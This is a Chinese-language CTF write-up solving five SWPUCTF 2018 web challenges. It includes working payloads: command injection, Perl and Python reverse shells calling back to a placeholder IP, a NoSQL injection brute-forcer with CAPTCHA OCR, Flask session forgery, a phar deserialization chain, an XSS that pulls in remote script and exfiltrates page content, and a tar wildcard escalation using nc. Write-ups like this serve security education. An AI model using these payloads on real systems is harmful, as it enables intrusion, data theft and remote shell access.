---
title: swpuctf-2018-web-writeup
date: 2018-12-20 11:03:32
tags: [ctf,writeup]
---

## 用优惠码买个X?

注册登录后可获得15位长的优惠码，使用时提示优惠码已失效，请输入24位长的优惠码，访问Support页面提示必须要先购买过商品

<!--more-->

![image-20181219091638095](./image-20181219091638095.png)

之前扫描网站根目录发现www.zip，其中发现关键代码如下：

```php
<?php
//生成优惠码
$_SESSION['seed']=rand(0,999999999);
function youhuima(){
	mt_srand($_SESSION['seed']);
    $str_rand = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $auth='';
    $len=15;
    for ( $i = 0; $i < $len; $i++ ){
        if($i<=($len/2))
              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
        else
              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
    }
    setcookie('Auth', $auth);
}
//support
	if (preg_match("/^\d+\.\d+\.\d+\.\d+$/im",$ip)){
        if (!preg_match("/\?|flag|}|cat|echo|\*/i",$ip)){
               //执行命令
        }else {
              //flag字段和某些字符被过滤!
        }
	}else{
             // 你的输入不正确!
	}
?>

```

可知24位优惠码需要爆破seed，进行伪造。这里使用php_mt_seed进行爆破，已知15位优惠码为`7oRKrYSG2kffxcE`,前几位出现在`$str_rand`中的位置为`33 14 53 46 17 60 54`

![image-20181219093440998](./image-20181219093440998.png)

得到seed为759331493，使用php7.1+的版本进行伪造并进行购买,进入support页面的函数逻辑。

发现返回内容为whois命令执行结果，猜测执行的命令为`system('whois '.$ip);`，preg_match时存在m参数会进行跨行匹配，所以可以使用`%0a`进行绕过，使用burp发送`127.0.0.1%0als /`看到flag在根目录，但命令中过滤了flag与cat

* 可使用`127.0.0.1%0amore /fla[f-i]`查看flag内容为`swpuctf{********08067_sec******$$%@!~~~~**}`

* `ls -i /`发现flag的inode为706017，根据inode查看文件内容

  ```
  ip=127.0.0.1%0atac `find / -inum 706017`
  ```

* 使用perl反弹shell

  ```perl
  ip=127.0.0.1%0aperl+-e+'use+Socket%3b$i%3d"your_ip"%3b$p%3d8000%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))%3bconnect(S,sockaddr_in($p,inet_aton($i)))%3bopen(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen(STDERR,">%26S")%3bexec("/bin/sh+-i")%3b'
  ```


## Injection

查看首页源代码发现`tips:info.php`,info.php为phpinfo页面,该页面发现`MongoDB Support`

尝试mongo注入，访问

```
http://123.206.213.66:45678/check.php?username=admin&password[$ne]=123&vertify=d4dk
```

提示`Nice!But it is not the real passwd`，确定注入点存在，写脚本跑一下

```python
import pytesseract
from PIL import Image
import requests
import os
import string

password = ''
string_list = string.ascii_letters + string.digits

s = requests.Session()
def try_login(j):
    res = s.get('http://123.206.213.66:45678/vertify.php')
    image_name = os.path.join(os.path.dirname(__file__),'yzm.jpg')
    with open(image_name, 'wb') as file:
        file.write(res.content)
    image = Image.open(image_name)
    code = pytesseract.image_to_string(image)
    res = s.get('http://123.206.213.66:45678/check.php?username=admin&password[$regex]=^'+password + j +'&vertify='+code)
    return res
is_found = False
for i in range(32):
    if not is_found:
        for j in string_list:
            res = try_login(j)
            while ('CAPTCHA' in res.content):
                res = try_login(j)
            if 'Nice!But it is not the real passwd' in res.content:
                password += j
                print password
                break
            elif 'username or password incorrect' in res.content:
                if j == string_list[-1]:
                    is_found = True
print 'final pass is:',password
```

![image-20181219120133532](./image-20181219120133532.png)

爆出密码为skmun，登录得到flag，`You got it! swpuctf{1ts_N05ql_Inj3ction}`

## 皇家线上赌场

首页发现存在`http://107.167.188.241/static?file=test.js`可以读取文件，尝试读取/proc目录下的文件获取系统信息，当访问`107.167.188.241/static?file=/proc/mounts`时可以发现web路径为`/home/ctf/web_assli3fasdf`,同时出题人给出提示

```python
if filename != '/home/ctf/web/app/static/test.js' and filename.find('/home/ctf/web/app') != -1:
            return abort(404)
```

读取app的文件时需要满足请求中不包含`/home/ctf/web/app`路径。尝试发现test.js文件的实际路径为`/home/ctf/web_assli3fasdf/app/static/test.js`,当前工作目录为`/home/ctf/web_assli3fasdf`，所以可用`/proc/self/cwd`等价替换，这样访问`/proc/self/cwd/app/static/test.js`也可得到test.js

访问`/proc/self/cwd/app/__init__.py`得到

```python

from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from .views import register_views
from .models import db


def create_app():
    app = Flask(__name__, static_folder='')
    app.secret_key = '9f516783b42730b7888008dd5c15fe66'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
    register_views(app)
    db.init_app(app)
    return app
```

访问`/proc/self/cwd/app/views.py`得到

```python

def register_views(app):
    @app.before_request
    def reset_account():
        if request.path == '/signup' or request.path == '/login':
            return
        uname = username=session.get('username')
        u = User.query.filter_by(username=uname).first()
        if u:
            g.u = u
            g.flag = 'swpuctf{xxxxxxxxxxxxxx}'
            if uname == 'admin':
                return
            now = int(time())
            if (now - u.ts >= 600):
                u.balance = 10000
                u.count = 0
                u.ts = now
                u.save()
                session['balance'] = 10000
                session['count'] = 0

    @app.route('/getflag', methods=('POST',))
    @login_required
    def getflag():
        u = getattr(g, 'u')
        if not u or u.balance < 1000000:
            return '{"s": -1, "msg": "error"}'
        field = request.form.get('field', 'username')
        mhash = hashlib.sha256(('swpu++{0.' + field + '}').encode('utf-8')).hexdigest()
        jdata = '{{"{0}":' + '"{1.' + field + '}", "hash": "{2}"}}'
        return jdata.format(field, g.u, mhash)
```

得到secret_key后即可在本地使用python3.5版本的flask进行session伪造：

```python
.eJw1i8sOQDAQAP9lzw6s0sfPyG67TQQrUU7i3xExt5lkTmCaSaNA8D8VxPXQ_SuPlC0P-zqJQgDKKXPtDTvs0bC1DRJb5uii6ZCSlZbq7BEqOIpsSou8V1pGhesG-uUg4A.XBdi4w.AJv5pxsqEtarLHf0HnXIp-XevmY
```

伪造session后可以进入getflag函数的逻辑

阅读源码发现将会访问`g.u`的field属性，而flag在`g.flag`中，所以可知需要通过field去访问g这个全局变量，想到使用`__globals__`方法获取全局变量，结合出题人给出的提示u存在一个save方法，结合代码逻辑进行尝试

最终构造payload：

```http
field=save.__globals__[db].init_app.__globals__[current_app].__dict__[view_functions][index].__globals__[g].flag
```

获取flag:

```json
{"save.__globals__[db].init_app.__globals__[current_app].__dict__[view_functions][index].__globals__[g].flag":"swpuctf{tHl$_15_4_f14G}", "hash": "b2ce49ebfd5bb7905b0fee5069fef8d98a0c2e515140be90c36e8dbf4b2288bf"}
```

## SimplePHP

访问首页后发现`http://120.79.158.180:11115/file.php?file=`页面存在文件读取，可以获取源码进行审计。发现上传图片后使用`file.php?file=`进行读取时将使用`file_exists`进行检测，结合class.php的内容，确定利用过程为构造phar文件反序列化读取特定文件。class.php主要内容如下:

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

结合使用以上类，可构造利用过程C1e4r->__destruct方法->`echo $this->test`->调用test的toString方法->构造test为Show类的实例->` $this->str['str']->source` ->调用str['str']的source属性 -> 构造 str['str']为Test的实例 -> 访问Test实例一个不存在的属性-> _get方法->get方法->file_get方法->读取$params数组中source键的值表示的文件名。根据以上逻辑，构造phar包的内容如下：

```php
<?php
class C1e4r
{
    public $test;
    public $str;
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
class Show
{
    public $source;
    public $str;
}
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$t = new Test();
$t->params = array("source"=>"/var/www/html/f1ag.php");
$s = new Show();
$s->str = array("str"=>$t);
$c = new C1e4r();
$c->str = $s;
$phar->setMetadata($c); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

构造phar后使用phar协议进行访问：

```http
http://120.79.158.180:11115/file.php?file=phar:///var/www/html/upload/5a1487d0a7b28733c4f8ddafdeb41f4e.jpg
```

解密返回的base64编码得到flag:

```php
<?php
	$flag = 'SWPUCTF{Php_un$eri4liz3_1s_Fu^!}';
?>
```

## 有趣的邮箱注册

查看页面源码发现注释代码：

```php
<!--check.php
if($_POST['email']) {
$email = $_POST['email'];
if(!filter_var($email,FILTER_VALIDATE_EMAIL)){
echo "error email, please check your email";
}else{
echo "等待管理员自动审核";
echo $email;
}
}
?>
```

参考Ph师傅[攻击LNMP架构Web应用的几个小Tricks](https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html)中的绕过技巧，构造如下email可反弹xss

```html
"a<script/src=//your_ip_address/myjs/xss.js></script>a"@example.com
```

admin页面只允许从本地登录，使用xss反弹后无法获取cookie，所以直接xss请求后台页面返回页面内容，构造的xss.js内容如下：

```js
//上方包含Jquery源码，省略
var xss_url='http://your_ip/index.php';
    //admin page
    $.get("http://localhost:6324/admin/admin.php",async=false,function(result){
        $.post(xss_url,data="admin_content="+result,async=false);
    });
```

收到页面内容为：

```html
<br /><a href="admin/a0a.php?cmd=whoami">
```

继续xss访问a0a.php并传递参数发现可以任意执行命令，wget一个py脚本到/tmp目录下并运行可以反弹shell

```python
#!/usr/bin/python

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("your_ip",8000));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

连接shell后发现当前用户为www-data，而/flag属于flag用户，所以无法直接读取flag，查看/var/www/html/目录

```shell
drwxr-xr-x 4 root root  4096 Dec 19 22:46 .
drwxr-xr-x 3 root root  4096 Dec 18 13:34 ..
drwxr-xr-x 6 root root  4096 Dec 19 19:03 4f0a5ead5aef34138fcbf8cf00029e7b
-rw-r--r-- 1 root root 11246 Dec 13 14:12 sp4rk.jpg
-rw-r--r-- 1 root root  7028 Dec 12 20:31 style.css
dr-xr-xr-x 3 root root  4096 Dec 18 14:27 www
```

发现存在4f0a5ead5aef34138fcbf8cf00029e7b目录，查看进程

```shell
flag     17493  0.0  0.6 265620 11620 ?        S    Dec19   0:01 php-fpm: pool flag
flag     20111  0.0  0.6 265620 11620 ?        S    Dec19   0:00 php-fpm: pool flag
flag     24772  0.0  0.6 265620 11620 ?        S    Dec19   0:00 php-fpm: pool flag
www-data 26807  0.0  0.6 265748 12004 ?        S    05:45   0:00 php-fpm: pool www
www-data 26808  0.0  0.5 265620 11116 ?        S    05:45   0:00 php-fpm: pool www
www-data 26809  0.0  0.5 265620 11116 ?        S    05:45   0:00 php-fpm: pool www
```

发现以flag与www-data用户分别运行着php-fpm服务，查看nginx配置文件可知4f0a5ead5aef34138fcbf8cf00029e7b目录下的文件以flag用户权限运行，需要从该目录下获取权限以查看flag，该目录下存在上传与压缩功能，根据源码，参考[利用通配符进行Linux本地提权](https://www.freebuf.com/articles/system/176255.html)，生成payload

```shell
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

上传生成的3个文件并进行备份操作即可反弹shell，读取flag`swpuctf{xss_!_tar_exec_instr3st1ng}`